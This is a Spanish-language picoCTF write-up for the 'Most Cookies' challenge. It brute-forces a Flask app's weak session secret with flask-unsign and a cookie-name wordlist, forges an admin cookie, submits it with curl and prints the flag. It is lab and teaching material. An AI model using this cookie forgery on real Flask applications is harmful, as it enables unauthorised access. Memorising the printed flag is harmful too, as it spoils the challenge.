#Software #Hacking #WebExplotation #Web #Internet 
# Definición
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/c135543530f7dc24c3a6ecaeb44a81b8/server.py) [http://mercury.picoctf.net:65344/](http://mercury.picoctf.net:65344/)
# Hints
- How secure is a flask cookie?
# Solución

Utilizamos [[wget]] para obtener el código de [[Python]].

```bash
┌──(kali㉿kali)-[~]
└─$ wget https://mercury.picoctf.net/static/c135543530f7dc24c3a6ecaeb44a81b8/server.py
--2025-04-05 21:46:19--  https://mercury.picoctf.net/static/c135543530f7dc24c3a6ecaeb44a81b8/server.py
Resolving mercury.picoctf.net (mercury.picoctf.net)... 18.189.209.142
Connecting to mercury.picoctf.net (mercury.picoctf.net)|18.189.209.142|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2021 (2.0K) [application/octet-stream]
Saving to: ‘server.py’

server.py           100%[================%3E]   1.97K  --.-KB/s    in 0s      

2025-04-05 21:46:24 (52.0 MB/s) - ‘server.py’ saved [2021/2021]
```

Obtenemos una cookie:
>eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z_HdKg.XyK72y474X2fO9bQdpyELl8rYb4

Decodificamos la cookie:
```bash
┌──(kali㉿kali)-[~]
└─$ echo eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z_HdKg.XyK72y474X2fO9bQdpyELl8rYb4 | base64 -d                                                          
{"very_auth":"snickerdoodle"}base64: invalid input
```

Vemos el codigo que descargamos:
```bash
┌──(kali㉿kali)-[~]
└─$ cat server.py
```

```python
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
        if session.get("very_auth"):
                check = session["very_auth"]
                if check == "blank":
                        return render_template("index.html", title=title)
                else:
                        return make_response(redirect("/display"))
        else:
                resp = make_response(redirect("/"))
                session["very_auth"] = "blank"
                return resp

@app.route("/search", methods=["GET", "POST"])
def search():
        if "name" in request.form and request.form["name"] in cookie_names:
                resp = make_response(redirect("/display"))
                session["very_auth"] = request.form["name"]
                return resp
        else:
                message = "That doesn't appear to be a valid cookie."
                category = "danger"
                flash(message, category)
                resp = make_response(redirect("/"))
                session["very_auth"] = "blank"
                return resp

@app.route("/reset")
def reset():
        resp = make_response(redirect("/"))
        session.pop("very_auth", None)
        return resp

@app.route("/display", methods=["GET"])
def flag():
        if session.get("very_auth"):
                check = session["very_auth"]
                if check == "admin":
                        resp = make_response(render_template("flag.html", value=flag_value, title=title))
                        return resp
                flash("That is a cookie! Not very special though...", "success")
                return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
        else:
                resp = make_response(redirect("/"))
                session["very_auth"] = "blank"
                return resp

if __name__ == "__main__":
        app.run()
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo apt install pluma
[sudo] password for kali:
The following packages were automatically installed and are no longer required:
  libflac12t64   libglapi-mesa         ruby-zeitwerk
  libgeos3.13.0  python3-setproctitle
Use 'sudo apt autoremove' to remove them.

Installing:
  pluma
                                                                             
Installing dependencies:
  gir1.2-gtksource-4  libappstream5   libxmlb2             zenity-common
  gir1.2-peas-1.0     libpeas-1.0-0   mate-desktop-common                    
  gir1.2-pluma-1.0    libpeas-common  pluma-common                          
  libadwaita-1-0      libstemmer0d    zenity                                
                                                                             
Summary:
  Upgrading: 0, Installing: 14, Removing: 0, Not Upgrading: 0
  Download size: 6,604 kB
  Space needed: 46.3 MB / 61.9 GB available

Continue? [Y/n] y
Get:1 http://http.kali.org/kali kali-rolling/main amd64 gir1.2-gtksource-4 amd64 4.8.4-5+b3 [20.4 kB]
Get:2 http://kali.download/kali kali-rolling/main amd64 libpeas-common all 1.36.0-3 [49.9 kB]
Get:3 http://http.kali.org/kali kali-rolling/main amd64 libpeas-1.0-0 amd64 1.36.0-3+b4 [60.8 kB]
Get:4 http://http.kali.org/kali kali-rolling/main amd64 gir1.2-peas-1.0 amd64 1.36.0-3+b4 [8,100 B]
Get:5 http://kali.download/kali kali-rolling/main amd64 gir1.2-pluma-1.0 amd64 1.26.1-2.1 [30.1 kB]
Get:6 http://http.kali.org/kali kali-rolling/main amd64 libstemmer0d amd64 2.2.0-4+b2 [119 kB]
Get:7 http://kali.download/kali kali-rolling/main amd64 libxmlb2 amd64 0.3.21-1 [63.0 kB]
Get:8 http://kali.download/kali kali-rolling/main amd64 libappstream5 amd64 1.0.4-1 [225 kB]
Get:9 http://http.kali.org/kali kali-rolling/main amd64 libadwaita-1-0 amd64 1.7~beta-2kali1 [527 kB]
Get:10 http://kali.download/kali kali-rolling/main amd64 mate-desktop-common all 1.26.2-1.1 [508 kB]
Get:11 http://kali.download/kali kali-rolling/main amd64 pluma-common all 1.26.1-2.1 [2,022 kB]
Get:12 http://kali.download/kali kali-rolling/main amd64 pluma amd64 1.26.1-2.1 [404 kB]
Get:13 http://kali.download/kali kali-rolling/main amd64 zenity-common all 4.1.90-1 [2,493 kB]
Get:14 http://kali.download/kali kali-rolling/main amd64 zenity amd64 4.1.90-1 [73.9 kB]
Fetched 6,604 kB in 7s (976 kB/s)                                          
Selecting previously unselected package gir1.2-gtksource-4:amd64.
(Reading database ... 411396 files and directories currently installed.)
Preparing to unpack .../00-gir1.2-gtksource-4_4.8.4-5+b3_amd64.deb ...
Unpacking gir1.2-gtksource-4:amd64 (4.8.4-5+b3) ...
Selecting previously unselected package libpeas-common.
Preparing to unpack .../01-libpeas-common_1.36.0-3_all.deb ...
Unpacking libpeas-common (1.36.0-3) ...
Selecting previously unselected package libpeas-1.0-0:amd64.
Preparing to unpack .../02-libpeas-1.0-0_1.36.0-3+b4_amd64.deb ...
Unpacking libpeas-1.0-0:amd64 (1.36.0-3+b4) ...
Selecting previously unselected package gir1.2-peas-1.0:amd64.
Preparing to unpack .../03-gir1.2-peas-1.0_1.36.0-3+b4_amd64.deb ...
Unpacking gir1.2-peas-1.0:amd64 (1.36.0-3+b4) ...
Selecting previously unselected package gir1.2-pluma-1.0.
Preparing to unpack .../04-gir1.2-pluma-1.0_1.26.1-2.1_amd64.deb ...
Unpacking gir1.2-pluma-1.0 (1.26.1-2.1) ...
Selecting previously unselected package libstemmer0d:amd64.
Preparing to unpack .../05-libstemmer0d_2.2.0-4+b2_amd64.deb ...
Unpacking libstemmer0d:amd64 (2.2.0-4+b2) ...
Selecting previously unselected package libxmlb2:amd64.
Preparing to unpack .../06-libxmlb2_0.3.21-1_amd64.deb ...
Unpacking libxmlb2:amd64 (0.3.21-1) ...
Selecting previously unselected package libappstream5:amd64.
Preparing to unpack .../07-libappstream5_1.0.4-1_amd64.deb ...
Unpacking libappstream5:amd64 (1.0.4-1) ...
Selecting previously unselected package libadwaita-1-0:amd64.
Preparing to unpack .../08-libadwaita-1-0_1.7~beta-2kali1_amd64.deb ...
Unpacking libadwaita-1-0:amd64 (1.7~beta-2kali1) ...
Selecting previously unselected package mate-desktop-common.
Preparing to unpack .../09-mate-desktop-common_1.26.2-1.1_all.deb ...
Unpacking mate-desktop-common (1.26.2-1.1) ...
Selecting previously unselected package pluma-common.
Preparing to unpack .../10-pluma-common_1.26.1-2.1_all.deb ...
Unpacking pluma-common (1.26.1-2.1) ...
Selecting previously unselected package pluma.
Preparing to unpack .../11-pluma_1.26.1-2.1_amd64.deb ...
Unpacking pluma (1.26.1-2.1) ...
Selecting previously unselected package zenity-common.
Preparing to unpack .../12-zenity-common_4.1.90-1_all.deb ...
Unpacking zenity-common (4.1.90-1) ...
Selecting previously unselected package zenity.
Preparing to unpack .../13-zenity_4.1.90-1_amd64.deb ...
Unpacking zenity (4.1.90-1) ...
Setting up gir1.2-gtksource-4:amd64 (4.8.4-5+b3) ...
Setting up gir1.2-pluma-1.0 (1.26.1-2.1) ...
Setting up libxmlb2:amd64 (0.3.21-1) ...
Setting up libpeas-common (1.36.0-3) ...
Setting up mate-desktop-common (1.26.2-1.1) ...
Setting up zenity-common (4.1.90-1) ...
Setting up libpeas-1.0-0:amd64 (1.36.0-3+b4) ...
Setting up pluma-common (1.26.1-2.1) ...
Setting up libstemmer0d:amd64 (2.2.0-4+b2) ...
Setting up libappstream5:amd64 (1.0.4-1) ...
Setting up libadwaita-1-0:amd64 (1.7~beta-2kali1) ...
Setting up zenity (4.1.90-1) ...
Setting up gir1.2-peas-1.0:amd64 (1.36.0-3+b4) ...
Processing triggers for man-db (2.13.0-1) ...
Processing triggers for libglib2.0-0t64:amd64 (2.83.3-2) ...
Processing triggers for mailcap (3.74) ...
Processing triggers for kali-menu (2025.1.1) ...
Processing triggers for desktop-file-utils (0.28-1) ...
Processing triggers for hicolor-icon-theme (0.18-2) ...
Processing triggers for libc-bin (2.40-3) ...
Setting up pluma (1.26.1-2.1) ...
```

Separamos las posibles galletas.

```txt
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo apt install flask-unsign
Error: Unable to locate package flask-unsign
                                                                             
┌──(kali㉿kali)-[~]
└─$ pip3 install flask-unsign
error: externally-managed-environment

× This environment is externally managed
╰─> To install Python packages system-wide, try apt install
    python3-xyz, where xyz is the package you are trying to
    install.
   
    If you wish to install a non-Kali-packaged Python package,
    create a virtual environment using python3 -m venv path/to/venv.
    Then use path/to/venv/bin/python and path/to/venv/bin/pip. Make
    sure you have pypy3-venv installed.
   
    If you wish to install a non-Kali-packaged Python application,
    it may be easiest to use pipx install xyz, which will manage a
    virtual environment for you. Make sure you have pipx installed.
   
    For more information, refer to the following:
    * https://www.kali.org/docs/general-use/python3-external-packages/
    * /usr/share/doc/python3.13/README.venv

note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages.
hint: See PEP 668 for the detailed specification.

┌──(kali㉿kali)-[~]
└─$ pip3 install python3-flask-unsign
error: externally-managed-environment

× This environment is externally managed
╰─> To install Python packages system-wide, try apt install
    python3-xyz, where xyz is the package you are trying to
    install.
   
    If you wish to install a non-Kali-packaged Python package,
    create a virtual environment using python3 -m venv path/to/venv.
    Then use path/to/venv/bin/python and path/to/venv/bin/pip. Make
    sure you have pypy3-venv installed.
   
    If you wish to install a non-Kali-packaged Python application,
    it may be easiest to use pipx install xyz, which will manage a
    virtual environment for you. Make sure you have pipx installed.
   
    For more information, refer to the following:
    * https://www.kali.org/docs/general-use/python3-external-packages/
    * /usr/share/doc/python3.13/README.venv

note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages.
hint: See PEP 668 for the detailed specification.
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo apt install python3-venv
python3-venv is already the newest version (3.13.1-2).
python3-venv set to manually installed.
The following packages were automatically installed and are no longer required:
  libflac12t64   libglapi-mesa         ruby-zeitwerk
  libgeos3.13.0  python3-setproctitle
Use 'sudo apt autoremove' to remove them.

Summary:
  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 0
```

Creamos el ambiente virtual y ahì instalamos el flash:

```bash
┌──(kali㉿kali)-[~]
└─$ python3 -m venv ~/.venv          
                                                                             
┌──(kali㉿kali)-[~]
└─$ source ~/.venv/bin/activate  
                                                                             
┌──(.venv)─(kali㉿kali)-[~]
└─$ python3 -m pip install flask-unsign
Collecting flask-unsign
  Downloading flask_unsign-1.2.1-py3-none-any.whl.metadata (6.9 kB)
Collecting flask (from flask-unsign)
  Downloading flask-3.1.0-py3-none-any.whl.metadata (2.7 kB)
Collecting requests (from flask-unsign)
  Downloading requests-2.32.3-py3-none-any.whl.metadata (4.6 kB)
Collecting itsdangerous (from flask-unsign)
  Downloading itsdangerous-2.2.0-py3-none-any.whl.metadata (1.9 kB)
Collecting markupsafe (from flask-unsign)
  Downloading MarkupSafe-3.0.2-cp313-cp313-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (4.0 kB)
Collecting werkzeug (from flask-unsign)
  Downloading werkzeug-3.1.3-py3-none-any.whl.metadata (3.7 kB)
Collecting Jinja2>=3.1.2 (from flask->flask-unsign)
  Downloading jinja2-3.1.6-py3-none-any.whl.metadata (2.9 kB)
Collecting click>=8.1.3 (from flask->flask-unsign)
  Downloading click-8.1.8-py3-none-any.whl.metadata (2.3 kB)
Collecting blinker>=1.9 (from flask->flask-unsign)
  Downloading blinker-1.9.0-py3-none-any.whl.metadata (1.6 kB)
Collecting charset-normalizer%3C4,>=2 (from requests->flask-unsign)
  Downloading charset_normalizer-3.4.1-cp313-cp313-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (35 kB)
Collecting idna<4,>=2.5 (from requests->flask-unsign)
  Downloading idna-3.10-py3-none-any.whl.metadata (10 kB)
Collecting urllib3<3,>=1.21.1 (from requests->flask-unsign)
  Downloading urllib3-2.3.0-py3-none-any.whl.metadata (6.5 kB)
Collecting certifi>=2017.4.17 (from requests->flask-unsign)
  Downloading certifi-2025.1.31-py3-none-any.whl.metadata (2.5 kB)
Downloading flask_unsign-1.2.1-py3-none-any.whl (14 kB)
Downloading flask-3.1.0-py3-none-any.whl (102 kB)
Downloading itsdangerous-2.2.0-py3-none-any.whl (16 kB)
Downloading werkzeug-3.1.3-py3-none-any.whl (224 kB)
Downloading MarkupSafe-3.0.2-cp313-cp313-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (23 kB)
Downloading requests-2.32.3-py3-none-any.whl (64 kB)
Downloading blinker-1.9.0-py3-none-any.whl (8.5 kB)
Downloading certifi-2025.1.31-py3-none-any.whl (166 kB)
Downloading charset_normalizer-3.4.1-cp313-cp313-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (144 kB)
Downloading click-8.1.8-py3-none-any.whl (98 kB)
Downloading idna-3.10-py3-none-any.whl (70 kB)
Downloading jinja2-3.1.6-py3-none-any.whl (134 kB)
Downloading urllib3-2.3.0-py3-none-any.whl (128 kB)
Installing collected packages: urllib3, markupsafe, itsdangerous, idna, click, charset-normalizer, certifi, blinker, werkzeug, requests, Jinja2, flask, flask-unsign
Successfully installed Jinja2-3.1.6 blinker-1.9.0 certifi-2025.1.31 charset-normalizer-3.4.1 click-8.1.8 flask-3.1.0 flask-unsign-1.2.1 idna-3.10 itsdangerous-2.2.0 markupsafe-3.0.2 requests-2.32.3 urllib3-2.3.0 werkzeug-3.1.3
```

Realizamos un ataque de fuerza bruta:
```bash
┌──(.venv)─(kali㉿kali)-[~]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z_HdKg.XyK72y474X2fO9bQdpyELl8rYb4" --wordlist cookies.txt
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'fortune'
```

Forjamos la nueva cookie:
```bash
┌──(.venv)─(kali㉿kali)-[~]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "fortune"
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z_HjPw.8TNzlFHIgnWTrbBE_352D_wF7VQ
```

Enviamos la nueva cookie
```bash
┌──(.venv)─(kali㉿kali)-[~]
└─$ curl -s http://mercury.picoctf.net:65344/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z_HjPw.8TNzlFHIgnWTrbBE_352D_wF7VQ
" | grep -oE "picoCTF{.*?}"
picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}
```
## Respuesta
picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}